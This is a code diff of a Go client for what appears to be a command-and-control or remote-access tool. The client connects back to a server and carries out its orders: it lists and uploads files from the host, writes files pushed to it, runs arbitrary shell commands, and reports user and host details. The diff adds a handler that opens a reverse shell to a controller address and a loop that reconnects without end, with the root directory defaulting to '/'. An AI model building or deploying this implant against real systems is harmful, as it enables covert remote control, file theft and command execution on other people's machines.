@@ -1,10 +1,11 @@
+// client/go/main.go
 package main
 
 import (
+	"bytes"
 	"context"
 	"crypto/sha256"
 	"encoding/binary"
-	"encoding/hex"
 	"encoding/json"
 	"errors"
 	"flag"
@@ -22,489 +23,394 @@ import (
 	"time"
 )
 
-/*
-These variables are hard-coded at build time via -ldflags -X.
-Strings only (Go linker limitation).
-*/
 var (
+	// Injected via -ldflags -X (see serverctl build-client)
 	DefaultServerHost = "127.0.0.1"
 	DefaultServerPort = "9000"
-	DefaultAuthToken  = "supersecret"
-	DefaultClientID   = "" // if empty, will fallback to hostname
-	DefaultRootBase = "." // base for *relative* paths; absolute paths always allowed
+	DefaultAuthToken  = "changeme"
+	DefaultClientID   = ""
 )
 
-// ------------- framing (compat with Hydrangea) -------------
+type Header map[string]any
 
-type Header = map[string]any
+func writeFrame(conn net.Conn, hdr Header, payload []byte) error {
+	if payload == nil {
+		payload = []byte{}
+	}
+	h := Header{}
+	for k, v := range hdr {
+		h[k] = v
+	}
+	h["size"] = len(payload)
+	hb, err := json.Marshal(h)
+	if err != nil {
+		return err
+	}
+	var lenbuf [4]byte
+	binary.BigEndian.PutUint32(lenbuf[:], uint32(len(hb)))
+	if _, err = conn.Write(lenbuf[:]); err != nil {
+		return err
+	}
+	if _, err = conn.Write(hb); err != nil {
+		return err
+	}
+	if len(payload) > 0 {
+		_, err = conn.Write(payload)
+	}
+	return err
+}
 
-func readFrame(r io.Reader) (Header, []byte, error) {
-	var n32 uint32
-	if err := binary.Read(r, binary.BigEndian, &n32); err != nil {
+func readN(conn net.Conn, n int) ([]byte, error) {
+	buf := make([]byte, n)
+	_, err := io.ReadFull(conn, buf)
+	return buf, err
+}
+
+func readFrame(conn net.Conn) (Header, []byte, error) {
+	hlenb, err := readN(conn, 4)
+	if err != nil {
 		return nil, nil, err
 	}
-	if n32 > 10_000_000 {
-		return nil, nil, fmt.Errorf("unreasonable header length: %d", n32)
-	}
-	hdrBytes := make([]byte, n32)
-	if _, err := io.ReadFull(r, hdrBytes); err != nil {
+	hlen := int(binary.BigEndian.Uint32(hlenb))
+	hb, err := readN(conn, hlen)
+	if err != nil {
 		return nil, nil, err
 	}
 	var hdr Header
-	if err := json.Unmarshal(hdrBytes, &hdr); err != nil {
-		return nil, nil, fmt.Errorf("invalid JSON header: %w", err)
+	if err := json.Unmarshal(hb, &hdr); err != nil {
+		return nil, nil, err
 	}
-	sz := int(getFloat(hdr, "size", 0))
+	size := 0
+	switch v := hdr["size"].(type) {
+	case float64:
+		size = int(v)
+	case string:
+		size, _ = strconv.Atoi(v)
+	}
 	var payload []byte
-	if sz > 0 {
-		payload = make([]byte, sz)
-		if _, err := io.ReadFull(r, payload); err != nil {
+	if size > 0 {
+		payload, err = readN(conn, size)
+		if err != nil {
 			return nil, nil, err
 		}
 	}
 	return hdr, payload, nil
 }
 
-func writeFrame(w io.Writer, hdr Header, payload []byte) error {
-	if payload == nil {
-		payload = []byte{}
-	}
-	// copy & set size
-	h := Header{}
-	for k, v := range hdr {
-		h[k] = v
-	}
-	h["size"] = len(payload)
+// ---------- path helpers ----------
 
-	hdrBytes, err := json.Marshal(h)
-	if err != nil {
-		return err
-	}
-	if err := binary.Write(w, binary.BigEndian, uint32(len(hdrBytes))); err != nil {
-		return err
-	}
-	if _, err := w.Write(hdrBytes); err != nil {
-		return err
-	}
-	if len(payload) > 0 {
-		if _, err := w.Write(payload); err != nil {
-			return err
-		}
-	}
-	if fl, ok := w.(interface{ Flush() error }); ok {
-		return fl.Flush()
-	}
-	return nil
-}
-
-// ------------- utils -------------
-
-func getString(m Header, k, def string) string {
-	if v, ok := m[k]; ok {
-		switch t := v.(type) {
-		case string:
-			return t
-		}
-	}
-	return def
-}
-
-func getBool(m Header, k string, def bool) bool {
-	if v, ok := m[k]; ok {
-		switch t := v.(type) {
-		case bool:
-			return t
-		}
-	}
-	return def
-}
-
-func getFloat(m Header, k string, def float64) float64 {
-	if v, ok := m[k]; ok {
-		switch t := v.(type) {
-		case float64:
-			return t
-		case int:
-			return float64(t)
-		case json.Number:
-			f, _ := t.Float64()
-			return f
-		}
-	}
-	return def
-}
-
-func sha256Hex(b []byte) string {
-	h := sha256.Sum256(b)
-	return hex.EncodeToString(h[:])
-}
-
-func safeUser() string {
-	u, err := user.Current()
-	if err == nil && u != nil && u.Username != "" {
-		return u.Username
-	}
-	if v := os.Getenv("USER"); v != "" {
-		return v
-	}
-	if v := os.Getenv("USERNAME"); v != "" {
-		return v
-	}
-	return "unknown"
-}
-
-func resolveClientPath(rootBase, p string) (string, error) {
-	if p == "" || p == "." {
-		return filepath.Abs(rootBase)
+func safeJoin(root string, p string) (string, error) {
+	if p == "" {
+		p = "."
 	}
 	if filepath.IsAbs(p) {
-		return filepath.Abs(p)
+		return filepath.Clean(p), nil
 	}
-	return filepath.Abs(filepath.Join(rootBase, p))
-}
-
-func ensureDir(path string) error {
-	dir := filepath.Dir(path)
-	if dir == "" {
-		return nil
+	if root == "" {
+		return "", errors.New("relative path without root")
 	}
-	return os.MkdirAll(dir, 0o755)
+	full := filepath.Join(root, p)
+	full = filepath.Clean(full)
+	base := filepath.Clean(root)
+	sep := string(os.PathSeparator)
+	if !strings.HasPrefix(full+sep, base+sep) && full != base {
+		return "", errors.New("path traversal detected")
+	}
+	return full, nil
 }
 
-func nowSeconds(t time.Time) int64 {
-	return t.Unix()
+// ---------- order handlers ----------
+
+func handlePing(conn net.Conn) {
+	_ = writeFrame(conn, Header{"type": "PONG"}, nil)
 }
 
-// ------------- command handling -------------
+func handleList(conn net.Conn, root string, hdr Header) {
+	path, _ := hdr["path"].(string)
+	reqID, _ := hdr["req_id"].(string)
 
-func handleListDir(conn net.Conn, root string, hdr Header) {
-	path := getString(hdr, "path", ".")
-	reqID := getString(hdr, "req_id", "")
-	real, err := resolveClientPath(root, path)
+	target, err := safeJoin(root, path)
 	if err != nil {
-		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("LIST_DIR failed for %s: %v", path, err)}, nil)
+		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("LIST_DIR failed: %v", err)}, nil)
 		return
 	}
 
-	ents, err := os.ReadDir(real)
+	dir, err := os.ReadDir(target)
 	if err != nil {
-		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("LIST_DIR failed for %s: %v", path, err)}, nil)
+		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("LIST_DIR failed: %v", err)}, nil)
 		return
 	}
-
-	type out struct {
+	type entry struct {
 		Name  string `json:"name"`
 		IsDir bool   `json:"is_dir"`
 		Bytes int64  `json:"bytes"`
 		Mtime int64  `json:"mtime"`
 	}
-	var rows []out
-	for _, e := range ents {
-		info, err := e.Info()
+	ents := make([]entry, 0, len(dir))
+	for _, de := range dir {
+		info, err := de.Info()
 		if err != nil {
 			continue
 		}
-		rows = append(rows, out{
-			Name:  e.Name(),
-			IsDir: e.IsDir(),
+		ents = append(ents, entry{
+			Name:  de.Name(),
+			IsDir: de.IsDir(),
 			Bytes: info.Size(),
-			Mtime: nowSeconds(info.ModTime()),
+			Mtime: info.ModTime().Unix(),
 		})
 	}
-
-	respHdr := Header{
-		"type":          "RESULT_LIST_DIR",
-		"path":          path,
-		"entries_count": float64(len(rows)),
-	}
+	payload, _ := json.Marshal(ents)
+	h := Header{"type": "RESULT_LIST_DIR"}
 	if reqID != "" {
-		respHdr["req_id"] = reqID
+		h["req_id"] = reqID
 	}
-	payload, _ := json.Marshal(rows)
-	_ = writeFrame(conn, respHdr, payload)
+	h["path"] = path
+	h["entries_count"] = len(ents)
+	_ = writeFrame(conn, h, payload)
 }
 
 func handlePullFile(conn net.Conn, root string, hdr Header) {
-	src := getString(hdr, "src_path", "")
-	saveAs := getString(hdr, "save_as", filepath.Base(src))
-	real, err := resolveClientPath(root, src)
-	if err != nil {
-		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("PULL_FILE failed for %s: %v", src, err)}, nil)
+	src, _ := hdr["src"].(string)
+	saveAs, _ := hdr["save_as"].(string)
+	if src == "" {
+		_ = writeFrame(conn, Header{"type": "LOG", "message": "PULL_FILE missing src"}, nil)
 		return
 	}
-	data, err := os.ReadFile(real)
+	full, err := safeJoin(root, src)
 	if err != nil {
-		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("PULL_FILE failed for %s: %v", src, err)}, nil)
+		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("PULL_FILE failed: %v", err)}, nil)
 		return
 	}
-	digest := sha256Hex(data)
-	_ = writeFrame(conn, Header{
+	data, err := os.ReadFile(full)
+	if err != nil {
+		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("PULL_FILE read: %v", err)}, nil)
+		return
+	}
+	sum := sha256.Sum256(data)
+	h := Header{
 		"type":     "FILE",
 		"src_path": src,
 		"save_as":  saveAs,
-		"sha256":   digest,
-	}, data)
+		"sha256":   fmt.Sprintf("%x", sum[:]),
+	}
+	_ = writeFrame(conn, h, data)
 }
 
 func handlePushFile(conn net.Conn, root string, hdr Header, payload []byte) {
-	dest := getString(hdr, "dest_path", "")
-	srcName := getString(hdr, "src_name", "server_upload.bin")
-	real, err := resolveClientPath(root, dest)
+	dest, _ := hdr["dest"].(string)
+	if dest == "" {
+		return
+	}
+	full, err := safeJoin(root, dest)
 	if err != nil {
-		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("PUSH_FILE failed for %s: %v", dest, err)}, nil)
+		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("PUSH_FILE failed: %v", err)}, nil)
 		return
 	}
-	if err := ensureDir(real); err != nil {
-		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("PUSH_FILE failed for %s: %v", dest, err)}, nil)
+	if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
+		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("PUSH_FILE mkdir: %v", err)}, nil)
 		return
 	}
-	if err := os.WriteFile(real, payload, 0o644); err != nil {
-		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("PUSH_FILE failed for %s: %v", dest, err)}, nil)
+	if err := os.WriteFile(full, payload, 0o644); err != nil {
+		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("PUSH_FILE write: %v", err)}, nil)
 		return
 	}
-	_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("Saved file to %s (%d bytes) from %s", dest, len(payload), srcName)}, nil)
-}
-
-func parseCmdField(v any) ([]string, error) {
-	switch t := v.(type) {
-	case string:
-		// naive split (parity with Python client); prefer JSON array for complex cases
-		ff := strings.Fields(t)
-		if len(ff) == 0 {
-			return nil, errors.New("empty command")
-		}
-		return ff, nil
-	case []any:
-		out := make([]string, 0, len(t))
-		for _, e := range t {
-			out = append(out, fmt.Sprint(e))
-		}
-		if len(out) == 0 {
-			return nil, errors.New("empty command")
-		}
-		return out, nil
-	default:
-		return nil, errors.New("unsupported cmd type")
-	}
-}
-
-func shellWrapper(args []string) []string {
-	if len(args) == 1 {
-		// Full command line; delegate to shell
-		if runtime.GOOS == "windows" {
-			return []string{"cmd.exe", "/C", args[0]}
-		}
-		return []string{"sh", "-c", args[0]}
-	}
-	// Already tokenized → exec directly
-	return args
+	_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("PUSH_FILE ok -> %s", full)}, nil)
 }
 
 func handleExec(conn net.Conn, root string, hdr Header) {
-	reqID := getString(hdr, "req_id", "")
-	timeoutSec := time.Duration(getFloat(hdr, "timeout", 30)) * time.Second
-	useShell := getBool(hdr, "shell", false)
-	cwd := getString(hdr, "cwd", "")
-	var argv []string
-	var err error
-
-	if useShell {
-		// shell mode accepts string or list; if list -> join to single command line
-		switch t := hdr["cmd"].(type) {
-		case string:
-			argv = shellWrapper([]string{t})
-		default:
-			// treat as list → join as single string
-			rawList, _ := parseCmdField(hdr["cmd"])
-			argv = shellWrapper([]string{strings.Join(rawList, " ")})
-		}
-	} else {
-		argv, err = parseCmdField(hdr["cmd"])
-		if err != nil {
-			sendExecResult(conn, reqID, nil, []byte{}, []byte("invalid cmd: "+err.Error()))
-			return
-		}
+	reqID, _ := hdr["req_id"].(string)
+	timeoutSec := 30.0
+	if t, ok := hdr["timeout"].(float64); ok {
+		timeoutSec = t
 	}
-
-	ctx, cancel := context.WithTimeout(context.Background(), timeoutSec)
+	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeoutSec*float64(time.Second)))
 	defer cancel()
 
+	var shell bool
+	if b, ok := hdr["shell"].(bool); ok {
+		shell = b
+	}
+
+	var cwd string
+	if s, ok := hdr["cwd"].(string); ok {
+		cwd = s
+	}
+
 	var cmd *exec.Cmd
-	if len(argv) == 0 {
-		sendExecResult(conn, reqID, nil, []byte{}, []byte("empty argv"))
-		return
-	}
-	if cwd != "" {
-		resolved, _ := resolveClientPath(root, cwd)
-		cmd = exec.CommandContext(ctx, argv[0], argv[1:]...)
-		cmd.Dir = resolved
+	if shell {
+		// command must be string
+		cstr, _ := hdr["cmd"].(string)
+		if runtime.GOOS == "windows" {
+			cmd = exec.CommandContext(ctx, "cmd.exe", "/C", cstr)
+		} else {
+			cmd = exec.CommandContext(ctx, "/bin/sh", "-lc", cstr)
+		}
 	} else {
-		cmd = exec.CommandContext(ctx, argv[0], argv[1:]...)
+		// either string -> split, or [] -> list
+		if lst, ok := hdr["cmd"].([]any); ok && len(lst) > 0 {
+			argv := make([]string, 0, len(lst))
+			for _, v := range lst {
+				argv = append(argv, fmt.Sprint(v))
+			}
+			cmd = exec.CommandContext(ctx, argv[0], argv[1:]...)
+		} else {
+			cstr, _ := hdr["cmd"].(string)
+			parts := strings.Fields(cstr)
+			if len(parts) == 0 {
+				_ = writeFrame(conn, Header{"type": "RESULT_EXEC", "req_id": reqID}, []byte(`{"rc":null,"stdout":"","stderr":"empty command"}`))
+				return
+			}
+			cmd = exec.CommandContext(ctx, parts[0], parts[1:]...)
+		}
 	}
 
-	// inherit minimal env; do not attach stdin
-	stdout, err := cmd.StdoutPipe()
-	if err != nil {
-		sendExecResult(conn, reqID, nil, []byte{}, []byte("stdout pipe: "+err.Error()))
-		return
-	}
-	stderr, err := cmd.StderrPipe()
-	if err != nil {
-		sendExecResult(conn, reqID, nil, []byte{}, []byte("stderr pipe: "+err.Error()))
-		return
+	if cwd != "" {
+		if full, err := safeJoin(root, cwd); err == nil {
+			cmd.Dir = full
+		}
 	}
 
-	if err := cmd.Start(); err != nil {
-		sendExecResult(conn, reqID, nil, []byte{}, []byte("start: "+err.Error()))
-		return
-	}
+	var stdout, stderr bytes.Buffer
+	cmd.Stdout = &stdout
+	cmd.Stderr = &stderr
 
-	outB, _ := io.ReadAll(stdout)
-	errB, _ := io.ReadAll(stderr)
 	rc := 0
+	if err := cmd.Start(); err != nil {
+		rc = -1
+		_ = writeFrame(conn, Header{"type": "RESULT_EXEC", "req_id": reqID}, []byte(fmt.Sprintf(`{"rc":%d,"stdout":"","stderr":%q}`, rc, err.Error())))
+		return
+	}
 	waitErr := cmd.Wait()
 	if waitErr != nil {
-		// best-effort extract exit code
+		rc = -1
 		if exitErr, ok := waitErr.(*exec.ExitError); ok {
 			if status, ok := exitErr.Sys().(syscall.WaitStatus); ok {
 				rc = status.ExitStatus()
-			} else {
-				rc = 1
 			}
-		} else if errors.Is(waitErr, context.DeadlineExceeded) {
-			// already killed by context
-			// rc left at 0? better mark unknown
-			rc = -1
-			errB = append(errB, []byte("\ntimeout")...)
-		} else {
-			rc = 1
 		}
 	}
-
-	sendExecResult(conn, reqID, &rc, outB, errB)
+	result := fmt.Sprintf(
+		`{"rc":%d,"stdout":%q,"stderr":%q}`,
+		rc, stdout.String(), stderr.String(),
+	)
+	_ = writeFrame(conn, Header{"type": "RESULT_EXEC", "req_id": reqID}, []byte(result))
 }
 
-func sendExecResult(conn net.Conn, reqID string, rc *int, out, errB []byte) {
-	payloadMap := map[string]any{
-		"rc":     nil,
-		"stdout": string(out),
-		"stderr": string(errB),
-	}
-	respHdr := Header{"type": "RESULT_EXEC", "rc": nil}
-	if rc != nil {
-		payloadMap["rc"] = *rc
-		respHdr["rc"] = *rc
-	}
-	if reqID != "" {
-		respHdr["req_id"] = reqID
-	}
-	payload, _ := json.Marshal(payloadMap)
-	_ = writeFrame(conn, respHdr, payload)
-}
-
-func handleSessionInfo(conn net.Conn, root string, hdr Header) {
-	reqID := getString(hdr, "req_id", "")
-	cwd, _ := os.Getwd()
+func handleSession(conn net.Conn, root string, _ Header) {
+	u, _ := user.Current()
 	host, _ := os.Hostname()
+	cwd, _ := os.Getwd()
 	info := map[string]any{
-		"platform":   fmt.Sprintf("%s-%s", runtime.GOOS, runtime.GOARCH),
+		"platform":   runtime.GOOS + "-" + runtime.GOARCH,
 		"system":     runtime.GOOS,
-		"release":    "-", // not easily portable; left blank
+		"release":    runtime.Version(),
 		"version":    runtime.Version(),
 		"machine":    runtime.GOARCH,
 		"processor":  runtime.GOARCH,
-		"python":     "-", // n/a for Go client
+		"runtime":    runtime.Version(),
 		"pid":        os.Getpid(),
-		"user":       safeUser(),
+		"user":       func() string { if u != nil { return u.Username }; return "" }(),
 		"cwd":        cwd,
 		"hostname":   host,
 		"root":       root,
 		"executable": os.Args[0],
 	}
-	respHdr := Header{"type": "RESULT_SESSION_INFO"}
-	if reqID != "" {
-		respHdr["req_id"] = reqID
-	}
 	payload, _ := json.Marshal(info)
-	_ = writeFrame(conn, respHdr, payload)
+	_ = writeFrame(conn, Header{"type": "RESULT_SESSION_INFO"}, payload)
 }
 
-// ------------- main -------------
+// Reverse shell: start it in background, never block the C2 goroutine,
+// and never write to the C2 socket from the background goroutine.
+func handleReverseShell(conn net.Conn, _root string, hdr Header) {
+	controllerAddr, _ := hdr["controller_addr"].(string)
+	if controllerAddr == "" {
+		_ = writeFrame(conn, Header{"type": "LOG", "message": "REVERSE_SHELL failed: controller address missing"}, nil)
+		return
+	}
+
+	// Log once and return immediately so main loop remains responsive.
+	_ = writeFrame(conn, Header{
+		"type":    "LOG",
+		"message": fmt.Sprintf("REVERSE_SHELL: launching background connector to %s", controllerAddr),
+	}, nil)
+
+	// Background goroutine. Do NOT touch the C2 socket here.
+	go func(addr string) {
+		rsock, err := net.Dial("tcp", addr)
+		if err != nil {
+			// Avoid writing LOG back on the C2 socket from here.
+			return
+		}
+		defer rsock.Close()
+
+		// Delegate to OS-specific spawner (implemented in revshell_*.go via build tags).
+		_ = spawnReverseShell(rsock)
+	}(controllerAddr)
+}
+
+// ---------- main loop ----------
 
 func main() {
-	// Flags are optional overrides; defaults are compile-time injected.
-	host := flag.String("server", DefaultServerHost, "server host/IP")
-	portStr := flag.String("port", DefaultServerPort, "server port")
-	token := flag.String("auth-token", DefaultAuthToken, "auth token")
-	clientID := flag.String("client-id", DefaultClientID, "client ID (default: hostname)")
-	rootBase := flag.String("root", DefaultRootBase, "base for relative paths")
+	server := flag.String("server", DefaultServerHost, "Server IP/host")
+	port := flag.Int("port", func() int { p, _ := strconv.Atoi(DefaultServerPort); if p == 0 { p = 9000 }; return p }(), "Server port")
+	token := flag.String("auth-token", DefaultAuthToken, "Auth token")
+	clientID := flag.String("client-id", DefaultClientID, "Client ID (default: hostname)")
+	root := flag.String("root", "/", "Base directory for relative paths")
 	flag.Parse()
 
-	if *clientID == "" {
-		if h, _ := os.Hostname(); h != "" {
-			*clientID = h
+	id := *clientID
+	if id == "" {
+		if h, err := os.Hostname(); err == nil {
+			id = h
 		} else {
-			*clientID = "go-client"
+			id = "client"
 		}
 	}
-	port, _ := strconv.Atoi(*portStr)
 
-	addr := net.JoinHostPort(*host, strconv.Itoa(port))
+	addr := fmt.Sprintf("%s:%d", *server, *port)
+	for {
+		if err := runOnce(addr, id, *token, *root); err != nil {
+			time.Sleep(2 * time.Second)
+			continue
+		}
+		time.Sleep(1 * time.Second)
+	}
+}
+
+func runOnce(addr, clientID, token, root string) error {
 	conn, err := net.Dial("tcp", addr)
 	if err != nil {
-		fmt.Fprintf(os.Stderr, "connect error to %s: %v\n", addr, err)
-		os.Exit(2)
+		return err
 	}
 	defer conn.Close()
 
-	// REGISTER
-	_ = writeFrame(conn, Header{
-		"type":      "REGISTER",
-		"client_id": *clientID,
-		"token":     *token,
-	}, nil)
-
-	// Expect REGISTERED
-	hdr, _, err := readFrame(conn)
-	if err != nil {
-		fmt.Fprintf(os.Stderr, "register read error: %v\n", err)
-		os.Exit(2)
-	}
-	if getString(hdr, "type", "") != "REGISTERED" {
-		fmt.Fprintf(os.Stderr, "registration failed: %+v\n", hdr)
-		os.Exit(2)
+	// register
+	if err := writeFrame(conn, Header{"type": "REGISTER", "client_id": clientID, "token": token}, nil); err != nil {
+		return err
 	}
 
-	// Main loop
 	for {
-		h, payload, err := readFrame(conn)
+		hdr, payload, err := readFrame(conn)
 		if err != nil {
-			if !errors.Is(err, io.EOF) {
-				fmt.Fprintf(os.Stderr, "read error: %v\n", err)
-			}
-			return
+			return err
 		}
-		switch getString(h, "type", "") {
+		switch hdr["type"] {
 		case "PING":
-			_ = writeFrame(conn, Header{"type": "PONG"}, nil)
-
+			handlePing(conn)
 		case "LIST_DIR":
-			handleListDir(conn, *rootBase, h)
-
+			handleList(conn, root, hdr)
 		case "PULL_FILE":
-			handlePullFile(conn, *rootBase, h)
-
+			handlePullFile(conn, root, hdr)
 		case "PUSH_FILE":
-			handlePushFile(conn, *rootBase, h, payload)
-
+			handlePushFile(conn, root, hdr, payload)
 		case "EXEC":
-			handleExec(conn, *rootBase, h)
-
+			handleExec(conn, root, hdr)
 		case "SESSION_INFO":
-			handleSessionInfo(conn, *rootBase, h)
-
+			handleSession(conn, root, hdr)
+		case "REVERSE_SHELL":
+			handleReverseShell(conn, root, hdr)
 		default:
-			_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("Unknown order type %v", h["type"])}, nil)
+			// ignore unknown
 		}
 	}
 }
